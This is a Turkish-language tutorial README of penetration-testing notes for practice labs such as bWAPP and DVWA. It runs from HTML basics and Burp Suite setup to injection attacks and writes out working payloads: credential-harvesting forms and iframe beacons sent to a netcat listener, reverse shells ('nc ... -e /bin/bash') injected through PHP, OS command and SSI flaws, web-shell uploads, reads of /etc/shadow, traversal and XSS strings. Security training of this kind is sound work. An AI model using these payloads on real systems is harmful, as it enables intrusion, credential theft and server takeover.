# Ethical Hacker Web Penetration Tests and Bug Bounty
- [IP Çeşitleri](#IP-Çeşitleri)
- [HTML Yazabileceğimiz Yerler](#HTML-Yazabileceğimiz-yerler)
- [HTML](#HTML)
  - [Tag](#Tag)
  - [Head](#Head)
  - [Body](#Body)
  - [Başlık](#Başlık)
  - [Boşluk](#Boşluk)
  - [Paragraf](#Paragraf)
  - [Anchor Tags](#Anchor-Tags)
  - [Form](#Form)
  - [Login Ekranı](#Login-Ekranı)
  - [Yorum Paneli](#Yorum-Paneli)
  - [Resim Yerleştirme](#Resim-yerleştirme)
  - [Buton Yerleştirme](#Buton-Yerleştirme)
  - [Footer ve Header](#Footer-ve-Header)
- [Burpsuite](#Burpsuite)
  - [BurpSuite Güncelleme](#BurpSuite-Güncelleme)
  - [Burpsuite İçine Sertifika Yükleme](#Burpsuite-İçine-Sertifika-Yükleme)
- [bWAPP](#bWAPP)
  - [bWAPP Kurulumu](#bWAPP-Kurulumu)
  - [HTML Injection Reflected low level](#HTML-Injection-Reflected-low-level)
  - [HTML Injection Stored low level](#HTML-Injection-Stored-low-level)
  - [Formlardan Kullanıcı Adı ve Şifre Hackleme](#Formlardan-Kullanıcı-Adı-ve-Şifre-Hackleme)
  - [Dirbuster](#Dirbuster)
  - [iFrame Injection](#iFrame-Injection)
- [PHP Açıkları](#PHP-Açıkları)
  - [PHP Code Injection](#PHP-Code-Injection)	 
  - [PHP Upload Injection low level](#PHP-Upload-Injection-low-level)
  - [PHP Upload Injection medium level](#PHP-Upload-Injection-medium-level)
- [Foxy Proxy](#Foxy-Proxy)
- [Kod Çalıştırma SSI](#Kod-Çalıştırma-SSI)
  - [Os Command Injection low level](#Os-Command-Injection-low-level)
  - [Os Command Injection medium level](#Os-Command-Injection-medium-level)
  - [Commix](#Commix)
  - [SSI Injection low level](#SSI-Injection-low-level)
  - [SSI Injection medium level](#SSI-Injection-medium-level)
- [Directory Traversal](#Directory-Traversal)
  - [Directory Traversal low level](#Directory-Travesal-low-level)
  - [DotDotPwn](#dotdotpwn)	  
- [XSS Açıkları](#XSS-Açıkları)
  - [XSS Reflected Get](#XSS-Reflected-Get)
  - [XSS Reflected medium](#XSS-Reflected-medium)
  - [XSS Reflected Ajax Json](#XSS-Reflected-Ajax-Json)
  - [XSS Stored](#XSS-Stored)
- [Broken Access Control](#Broken-Access-Control)
  - [Broken Auth Insecure Login Form](#Broken-Auth-Insecure-Login-Form)
  - [Broken Auth Logout Management](#Broken-Auth-Logout-Management)
  - [Broken Auth Administrative Portals low level](#Broken-Auth-Administrative-Portals-low-level)
  - [Broken Auth Administrative Portals Cookie](#Broken-Auth-Administrative-Portals-Cookie)
- [IDOR Insecure Direct Object References](#IDOR-Insecure-Direct-Object-References)
  - [Insecure DOR Change Secret](#Insecure-DOR-Change-Secret)
  - [Insecure DOR Reset Secret](#Insecure-DOR-Reset-Secret)
  - [Insecure DOR Order Ticket](#Insecure-DOR-Reset-Secret)
- [Portswigger](#Portswigger)
  - [Başkasının Chat Geçmişini Okuma](#Başkasının-Chat-Geçmişini-Okuma)
- [Metasploitable 2 DataBase Değiştirme](#Metasploitable-2-DataBase-Değiştirme)
- [Mutillidae Cookie](#Mutillidae-Cookie)
- [CSRF Cross Site Requset Forgery](#CSRF-Cross-Site-Requset-Forgery)
  - [CSRF Mutillidae](#CSRF-Mutillidae)
  - [CSRF DVWA](#CSRF-DVWA)
  - [CSRF Link ile Hackleme](#CSRF-Link-ile-Hackleme)
- [Brute Force](#Brute-Force) 
  - [Şifre Bulma](#Şifre-Bulma)
  - [Kullanıcı Adı ve Şifre Bulma](#Kullanıcı-Adı-ve-Şifre-Bulma)
- [SQL](#SQL)	
- [SQL Komutları](#SQL-Komutları)
  - [Tablo Listeleme](#Tablo-Listeleme)
  - [Tablo Oluşturma](#Tablo-Oluşturma)
  - [Tabloya Veri Ekleme](#Tabloya-Veri-Ekleme)
  - [Tablo Filtreleme](#Tablo-Filtreleme)
  - [Tablo Güncelleme](#Tablo-Güncelleme)
  - [Tablodan Veri Silme](#Tablodan-Veri-Silme)
  - [2 Tabloyu Birlikte Listeleme](#2-Tabloyu-Birlikte-Listeleme)
  - [Tablodaki Sütun Sayısını Bulma](#Tablodaki-Sütun-Sayısını-Bulma)
  - [Tablodaki Verileri Çekme](#Tablodaki-Verileri-Çekme) 
- [SQL Injection](#SQL-Injection)
  - [SQL Post Methodu](#SQL-Post-Methodu)
    - [SQL Şifre Girmeden Login Olma](#SQL-Şifre-Girmeden-Login-Olma)
    - [Daha Güvenli Sitelerde SQL Açığı](#Daha-Güvenli-Sitelerde-SQL-Açığı)
  - [SQL Get Methodu](#SQL-Get-Methodu)
  - [SQL Union Select](#SQL-Union-Select)
    - [SQL Union Select Sütun Sayısı Öğrenme](#SQL-Unio-Select-Sütun-Sayısı-Öğrenme)
    - [SQL Union Select Database Öğrenme](#SQL-Union-Select-Database-Öğrenme)
    - [SQL Union Select Tablo İsimlerini Öğrenme](#SQL-Union-Select-Tablo-İsimlerini-Öğrenme)
    - [SQL Union Select Sütun İsimlerini Öğrenme](#SQL-Union-Select-Sütun-İsimlerini-Öğrenme)
    - [SQL Union Select Sütun İçindeki Bilgileri Öğrenme](#SQL-Union-Select-Sütun-İçindeki-Bilgileri-Öğrenme) 

# IP Çeşitleri
> ## Public IP 
- Kamuya açık IP
> ## Local IP
- Modem tarafından bize verilen IP. Modemimizi her resetlediğimizde değişir
---
# HTML Yazabileceğimiz Yerler
> ## 1.Nano
- ```nano html101.html``` yazarak yeni bir html dosyası açabilir içine yazabiliriz
> ## 2. Geany 
- Geany'i sadece ```HTML``` değil başka dilleri yazarkende kullanabiliriz
```
apt-get install geany
geany
```
> ## 3. Gedit
```
apt-get install gedit
gedit html101.html
```
---
# HTML
![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2011.19.59.jpeg)

> ## Tag
- ```<DOCTYPE html>``` belgenin tipini belirtir. Biz HTML kullanıyoruz demektir
> ## Head
- ```<HEAD>``` içine "meta data" dediğimiz genel özellikler yazılır
```
<head>
  <title>Kali Linux Website</title>
</head>
```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2011.33.24.jpeg)
> ## Body
- ```<BODY>``` içine kullanıcının gördüğü elemanları yazarız

- ```<!--NOT-->``` kullanarak kod içine notlar bırakabiliriz
> ## Başlık 
- ```<h1>Hello World</h1>``` Başlık olarak büyük ve kalın fontta yazar

- ```<h2>Hello World</h2>``` Biraz daha küçük boyutta ve kalınlıkta yazar

- 

- 

- 

- ```<h6>Hello World</h6>``` Olabilecek en küçük boyut ve kalınlıkta yazar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2011.49.48.jpeg)

> ## Boşluk
- ```<br>``` Bir satır boşluk bırakır
> ## Paragraf
- ```<p></p>``` içine yazılan şeyler metin görünümünde olur

- ```<p><stong>test</strong></p>``` metini kalın yazar

- ```<p><em>test</em></p>``` metini italik yazar
> ## Anchor Tags
- Link eklemek için kullanılır

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2013.08.32.jpeg)

- Google'a ```html acher tag attributes``` yazarak yapılabilecek değişiklikleri görebiliriz
  
- ```<a href="https://google.com">my link</a>``` sayfa yönledirmek için kullanılır (google'a yönlendirir)

- ```<a target=' blank' href="https://google.com">my link</a>``` linkteki sayfayı yeni sekmede açar (google'ı açar)
> ## Form
- Kullanıcıdan girdi alınırken kullanılır
- ```<form></form>``` içine yazılır
- ```<div></div>``` form içini gruplamak için kullanılır
- ```<label>Yorum</label>``` içine ufak textler bulundurur
- ```<input>``` kullanıcıdan girdi alınırken kullanılır
> ## Login Ekranı
```
<form> 
<div>
    <label>Kullanıcı Adı</label>
    <input> type="text" name="username" placeholder="username">
</div>
<div>
    <label>Şifre</label>
    <input> type="password" name="password" placeholder="password">
</form>
```
- ```type``` tipinin en olacağı ```password``` yazarsak yazdığımız şey gizlenmiş olarak gösterilir ```text``` yazarsak normal gösterilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/20286080ce72c1be333fbda0a9a832d548d58380/Pictures/WhatsApp%20Image%202022-09-12%20at%2020.38.24%20(3).jpeg)

- ```placeholder``` o kısım boşken içinde yazacağı şey

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2013.34.25.jpeg)
> ## Form
```
<form>
<div>
    <label>Yorum</label>
    <textarea name="text area"></textarea>
</div>
</form>
```

> ## Resim Yerleştirme
- ```<img width="600px" height=""400px" src="<resim URL'si>">```
> ## Buton Yerleştirme
- ```<button>click me </button>``` click me yazılı bir buton eklenir
> ## Footer ve Header
- ```<footer>Copyright ahmetnuysal 2022</footer>``` Sayfanın alt kısımına bilgi eklememizi sağlar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2013.57.35.jpeg)

- ```<header>...</header>``` Sayfanın en üstüne bilgi eklememizi sağlar
# Burpsuite 

### Burpsuite'nin ücretsiz versiyonunda projelerimizi kaydedemiyoruz

> ## BurpSuite Güncelleme
- Burpsuite güncellemesi yaparken ```.sh``` dosyasını indirdikten sonra terminal üzerinden bulunduğu konuma giderek ```bash dosyaadı.sh``` çalıştırıp güncelliyoruz
- ```proxy -> options``` kısımına girip ```127.0.0.1:8080``` yazıp yazmadığını kontrol ediyoruz yoksa add diyerek ekliyoruz
- Belirlediğimiz ```proxy``` adresini firefox'a da bildirmemiz gerekiyor, bunun için;
```
firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyoruz
-> HTTP  proxy 127.0.0.1 ve port 8080 yazıyoruz -> Also use this proxy HTTPS'i seçiyoruz
```
- Bu ayarlamayı sadece ```Burpsuite``` kullanırken yapmamız gerekiyor
- ```Intercept```içine girip ```Intercept is off``` olduğunu kontrol ediyoruz
> ## Burpsuite İçine Sertifika Yükleme

- Burpsuite içine sertifika yüklemek için ```install burpsuite certificate firefox```'u google'llıyoruz
- ```Portswigger``` sitesine giriyoruz
- ```http://burp```'e girip ```CA certificate```'e tıklayıp indiriyoruz
- ```firefox setting -> certificate aratıyoruz -> view certificate -> import``` diyip indirdiğimiz dosyayı seçiyoruz

# bWAPP

> ## bWAPP Kurulumu
- Bee-box sanal makinesini ayarlamalarını yapıp kuruyoruz. 
- Bee-box'ı kurduktan sonra açıyoruz, masaüstüne bulunan start'a basıyoruz.
- Terminali açıp ```setxkbmap tr``` ve ```ifconfig``` çalıştırıyoruz
- Kalimizi açıyoruz ve ```bee-box IP``` adresimizin websitesine giriş yapıyoruz

| kullanıcı adı | bee |
| --- | --- |
| şifre | bug |

- Hangi açık üzerinden gitmek istiyorsak onu ve zorluk level'ini seçebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/1.jpeg)

> ## HTML Injection Reflected low level

! Bu yöntemi burpsuite kullanmadan da yapabiliriz.

! ```Get```-> Gönderirken

! ```Post``` -> Alırken kullanılır

- Burpsuite açıyoruz ve ```Intercept -> ıntercept is on``` yapıyoruz. Artık sitede işlem yapmadan önce yakalayıp bize yollayacak
- ```Forward```'a basarak işlemi yolluyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/2.jpeg)

- Site'nin name kısmına ```<h1>ahmet</h1>``` yazıyoruz ve deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/3.jpeg)

- ```HTML injection cheat sheet github```'ı google'llıyoruz ve yazabileceğimiz diğer HTML kodlarını görüyoruz
- Name kısmına ```<h1>Hello<script>alert(1)</script>!</h1>```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/4.jpeg)

! Eğer çalışıyorsa sitede HTML injection vardır ve JS kodu çalıştırılabiliyordur

> ## HTML Injection Stored low level 

! ```Stored``` o siteye giren herkesi etkiliyor demektir. (Örneğin blog siteleri)

- Yazı yazdığımız kısıma ```<h1>ahmet</h1>``` deniyoruz, eğer çalışıyorsa açık var demektir
- ```<iframe src="{resim linki}"></iframe>``` ile blog sitesine resim eklemeyi deniyoruz

! Google'a ```iframe html``` aratarak gerekli diğer kodlara erişebiliriz

- ```nc -nvlp 4545``` ile NATCAT açıyoruz
- ```<iframe src="http://192.168.123.123:4545/test" height="0" width="0"></iframe>``` Normalde IP adresimiz bizim Publıc IP'miz olmalıdır, Port numarası çalışmazsa değiştirilebilir, ```height ve width```'i blog'a eklenen şey görülmesin diye 0 yapıyoruz
- Artık o siteye giren cihazların IP adreslerini görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/5.jpeg)

> ## Formlardan Kullanıcı Adı ve Şifre Hackleme

- ```nc -nvlp 4545``` ile NATCAT çalıştırıyoruz
- ```geany``` açıyoruz
```
<form name="login" action="http://192.168.123.123:4545/test.html">
  <table>
	  <tr><td>Username:</td><td><input type="text" name="username" placeholder="username"></td></tr>
		<tr><td>Password:</td><td><input type="password" name="password" placeholder="password"></td></tr>
	</table>
	<input type="submit" value="Login">
</form>
```
- Yazdığımız HTML kodunu blog'a yapıştırıyoruz. Kodu yazdığımız sitenin kendi login ekranının hazır HTML kodlarınıda yapıştırabiliriz
- Kullanıcılar o kısıma login yaptıklarında giriş bilgilerini ```NATCAT``` üzerinden görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/6.jpeg)

> ## Dirbuster

- Sitedeki gizli subdomainleri bulmamızı sağlar
- Kali'mizde ```dirbuster```'ı açıyoruz
- ```Target URL```'yi giriyoruz
- ```Autoswitch```'i yazıyoruz
- ```Number of threads```'i seçiyoruz. Eğer hedef sitede ```firewall``` varsa ```Number of threads```'i 10 yapıyoruz, yoksa 200 yapabiliriz
- ```file with list of dir``` seçiyoruz. İçinde bir sürü popüler dosya ismi bulundural .txt dosyasını seçiyoruz
- ```Kali -> usr -> share -> wordlist -> dirbuster -> directory-list-2-.3-medium.txt``` 
- Worldlist içinde farklı konularda .txt dosyaları bulunur, saldırı türüne göre dosya seçilir. fasttrack.txt -> şifreler namelist.txt -> usernameler
- ```Start``` diyoruz
- ```Result``` kısmına tıklarsak sonuçları (subdomainleri) görebiliriz
! HTTP 80 portunu kullanır
- ```Responsu 200``` olanlar gerçekten bulunur, diğerleri hata verebilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/8.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/9.jpeg)

> ## iFrame Injection

- Siteye sağ tıklayıp ```view page source``` açıyoruz
- ```CTRL+F``` yapıp ```iframe``` arıyoruz
- ```<iframe frameborder="0" src="robots.txt" height="250" width="250"></iframe>``` kodunda bulunan ```robots.txt```'i değiştirirsek ekranda o subdomain'i görürüz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/10.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/11.jpeg)

- ```burpsuite```i açıp ```intercept is on``` yapıyoruz ve ```forward```'a basıyoruz 
- ```Get/bWAPP/iframe...``` kısmını değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/12.jpeg)

- Bu kısımdaki iframe kodunu kapatıp  sonuna ```</iframe><h1>hellohtml</h1>``` ekliyoruz (...ParamHeight=250"></iframe></h1>) ve ```forward```diyoruz

# PHP Açıkları

> ## PHP Code Injection

- Dosya upload ederek yararlanılan zaafiyetlerdir
- PHP açıklarında ```burpsuite``` kullanılabilir, eğer parametre linkte varsa ```burpsuite``` kullanmaya gerek yok

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.01.34.jpeg)

- Parametreler linkte yoksa ```burpsuite``` içinde ```intercept is on``` yapıyoruz ve yakaladığmız ```GET``` dosyası içinde değişiklik yapıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.02.36.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.03.08.jpeg)

- ```...?message=hello;system("whoami")``` deniyoruz. ";" işareti aynı anda 2 komut çalıştırmamızı sağlar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.09.37.jpeg)

- ```...?message=hello;system("cat /etc/passwd")``` ve ```...?message=hello;system("cat /etc/shadow")``` deniyoruz, bu kod ile sistem şifrelerini görebiliriz

! cat /etc/passwd ve cat /etc/shadow içerisinde kriptolanmış kali şifrelerini görebiliriz.

- ```Natcat``` kullanarak dinleme yapabileceğimiz gibi portlara bilgide yollayabiliriz
- ```nc -nvlp 1234``` ile dinlemeyi başlatıyoruz
- ```...?message=test;system("nc 192.168.123.123 1234 -e /bin/bash")``` çalıştırıyoruz işe yaramazsa ```-e /bin/sh``` deneyebiliriz
- Terminal'i kullanarak site içerisinde gezinebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.18.38.jpeg)

- Sunucuda bir python kodu çalıştırabiliyorsak kendimiz bir shell açabiliriz
- Terminal üzerinden site sunucusundayken ```python -c import pty; pty.spawn("/bin/bash")``` yazıyoruz ve shell açmayı deniyoruz

> ## PHP Upload Injection low level

- Görsel yükleyebildiğimiz sitelerde yararlanılan bir zaafiyettir
- Site içerisine ```.php``` dosyası yüklemeyi deneriz
- ```.php``` dosyası hazırlarken ```weevely``` kullanırız

```
weevely generate <password><dosya ismi> -> .php dosyası oluşturur
weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanarak shell içine girmemizi sağlar
```
- Eğer site içerisinde dosyanın yüklendiği konum görünmüyorsa ```burpsuite``` açıp ```response``` kısmından bulabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.47.45.jpeg)

- Artık sunucu içine giriş yaptık, sunucu içinde komutlarla (ls,pwd vb) dolaşabiliriz

> ## PHP Upload Injection medium level

- Bazı siteler bazı uzantıları engellemiş olabilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.52.17.jpeg)

- O zaman ```.php``` dosyamızın bulunduğu konuma gideriz ```cp myphp.php myphp.php3``` kodu ile dosyayı farklı isimle kopyalarız, Çalışmazsa ```.php4 veya .php5``` deneyebiliriz

# Foxy Proxy

- ```Foxy Proxy``` firefox içinde elimiz ile yaptığımız proxy ayarını tek tıkla yapmamızı sağlar
- Google'a ```Foxy Proxy``` yazıp firefox'umuza ekliyoruz
- İçine girip ```options -> add -> gerekli yerleri dolduruyoruz``` 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.32.02.jpeg)

# Kod Çalıştırma SSI

> ## Os Command Injection low level

- Sunucuda komut çalıştımamızı sağlayan zafiyettir
- ```Burpsuite``` içinde ```ıntercept is on``` yapıyoruz, web sitesinden look up diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)

- Siteye yolladığımız url sonunda ```;whoami``` ekleyip deniyoruz, eğer çalışırsa açık var demektir
- ```nc -nvlp 1234``` çalıştırıyoruz
- Siteye yolladığımız url sonuna ```;nc 192.168.123.123 1234 -e /bin/bash``` ekliyoruz 
- Terminalimizi açıp açılan shell üzerinden server içinde dolaşabiliriz

> ## Os Command Injection medium level

- Bazı siteler ";" ile yazdığımız komutları filterlerip ";"'lleri silebilir çalışmaya biliri 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)

- Aynı anda iki komut çalıştırmamızın başka yollarıda vardır;
  - ```www.nsa.gov|pwd``` deneyebiliriz ya da ```www.nsa.goc&&pwd``` deneyebiliriz 
  - ```"|" ve "&&" aynı ";" gibi işimize yarar```
- ```nc -nvlp 1234``` çalıştırıp
- ```www.nsa.gov | nc 192.168.123.123 1234 -e /bin/bash``` diyerek giriş yapabiliriz ve terminal üzerinden server'da dolaşabiliriz

> ## Commix

- Komut enjeksiyonunda bulunan açıkları bulur ve bu açıkları exploit eder

! ```cookie``` daha önceden girdiğimiz sitelerdeki bilgilerimiz cookie olarak kaydedilir ve daha sonra tekrar girdiğimizde sitenin bizi tanımasını sağlar (siteye çok giren kişiye ekstra indirim yapılması gibi)

- ```commit -h``` help kısmının açar
- ```cookie``` kullanan sitelerde ```PHPSESSID``` ve ```target``` bilgilerini kullanırız
- ```commix --url="<site url'si>" --cookie="<cookie kısmında yazan bilgiler (security level ve PHPSESSID) --data="<target kısımında yazan bilgiler>"``` 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.27.44.jpeg)

- ```data ve cookie``` bilgileri ```Burpsuite``` içinde POST'lardan birine tıklayarak elde edebiliriz
- ```commix``` ile açığı arayıp bulduğu zaman shell oluşturur

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.38.19.jpeg)

> ## SSI Injection low level

- ```SSI (server-side ıncludes)```: Sunucuda çalıştırılan bir programlama dilidir. ".shtml, .stm, .shtm" varsa SSI kullanılıyor demektir
- Gerekli SSI kodlarına ve nasıl uygulanacağı google'dan ulaşabiliriz;

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.44.08.jpeg)

  - ```include```: Dosya yüklemek için kullanılır
  - ```exec```: Komut çalıştırmak için kullanılır
  - ```echo```: Yazdırma işlemi için kullanılır

- Siteyle etkileşime girebilceğimiz yere ```<!--#exec cmd="ls"-->``` yazıyoruz ve deniyoruz
- Açık varsa terminali açıyoruz ```nc -nvlp 1234``` çalıştırıyoruz
- Siteye gidip ```<!--#exec="192.168.123.123 1234 -e /bin/bash"``` yazıyoruz 
- Terminale girip açık shell'den site içerisinde dolaşıyoruz

> ## SSI Injection medium level

- Bazı sitelerde ```(<!--#exec...)``` çalışmazsa koddaki bir şey filterlenmiş olabilir
- Kodda bulunan parçalardan 2 tane koyarak tek tek deniyoruz ```(<<!--#exec...)``` 
- Bu sitede tırnak işaretlerini kaldırıyoruz ve deniyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.48.23.jpeg)

- Bunu kolay yoldan yapmak için ```commix``` kullanılabilir, ancak bazı durumlarda manuel olarak tek tek denememiz gerekir

# Directory Traversal

- Erişim sağlayamayacağımız yerlere erişim sağlama hatasıdır

> ## Directory Traversal low level

- Url üzerinde .php kullanıldığını görüyoruz
- Yoksa ```Burpsuite intercept is on```diyerek görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2013.31.02.jpeg)

- Linux sunucularında çoğunlukla ```apache``` kullanılır ve websitesi kodları ```/var/www/html``` içerisinde bulunur
- URL sonunda bulunan ```message.txt```'nin nerde olduğunu bulursak ```cd ..``` ve ```cd``` komutlarıyla dolaşıp başka dosyalara erişim sağlayabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2013.38.43.jpeg)

- Link sonuna ```../``` ekleyerek geri gitmeyi deniyoruz. Kaç tane geri gideceğimizi bilmiyoruz ve ```../``` sonuna ```/etc/passwd``` ekliyoruz
- Ya da ```?page=/etc/passwd``` şeklinde yazabiliriz çünkü ```../``` sitede filtrelenmiş ve çalışmıyor olabilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2013.47.54.jpeg)

> ## DotDotPwn

- DotDotPwn bizim manuel olarak denediğimiz seçenekleri bizim yerimize dener ve hangi seçenekleri deneyebileceğimizide gösterir
- ```apt-get install dotdotpwn``` ile yüklüyoruz
- ```dotdotpwn``` çalıştırabileceğimiz kodları gösterir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/ff2c37a1995ef7490ea089a51a69693142473235/Pictures/WhatsApp%20Image%202022-09-10%20at%2014.06.55.jpeg)

  - ```-m```: Ne ile çalışacağımızı söyleriz (hhtp vb)
  - ```-h```: Taradığımız websitesi linki
  - ```-O```: Sunucunun işletim sistemini anlamaya çalışır (genelde linux kullanılır)
  - ```-d```: Kaç tane ".../" deneyeceğimizi söyleriz 
  - ```-S```: Site https ise belirtmemizi sağlar

- ```dotdotpwn -m http -m 192.168.123.123/bWAPP/directory_traversal_1.php?page=message.txt``` testi başlatır ve Reports klasörü içine kayıt eder
- Açık olan kısımlar ```VULNERABLE!``` olarak çıkar

# XSS Açıkları

> ## XSS Reflected Get

- ```HTML``` açığına benziyor fakat XSS'de sitde ```JS kodu``` çalıştırmayı deniyoruz
- Bu açığı ```BEEF``` ile birleştirerek hedef browser'ları hackeleyebiliriz
- Genellikle ```<script>alert("hacked")</script>``` kodunu deneriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/63363176489464eabac5425aa7a2920f627c16fd/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.20.35.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.21.39.jpeg)

- Bazen kodda bulunan bazı şeyler filtrelenmiş olabilir ```<script>``` gibi. O zaman kodu farklı şekilde yazmayı deneriz, Örneğin; ```<ScRipT>alert("hacked")</ScRipT>``` şeklinde yazabiliriz
- Bulana kadar başka kodları deneriz
- Google'a ```XSS-Payloads``` yazarak denenilebilecek diğer kodları görebiliriz

> ## XSS Reflected medium

- ```<ScRiPt>alert(1)</sCriPt>``` deneriz
- ```</script><script>alert(1)</script>``` deneriz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-11%20at%2014.23.13.jpeg)

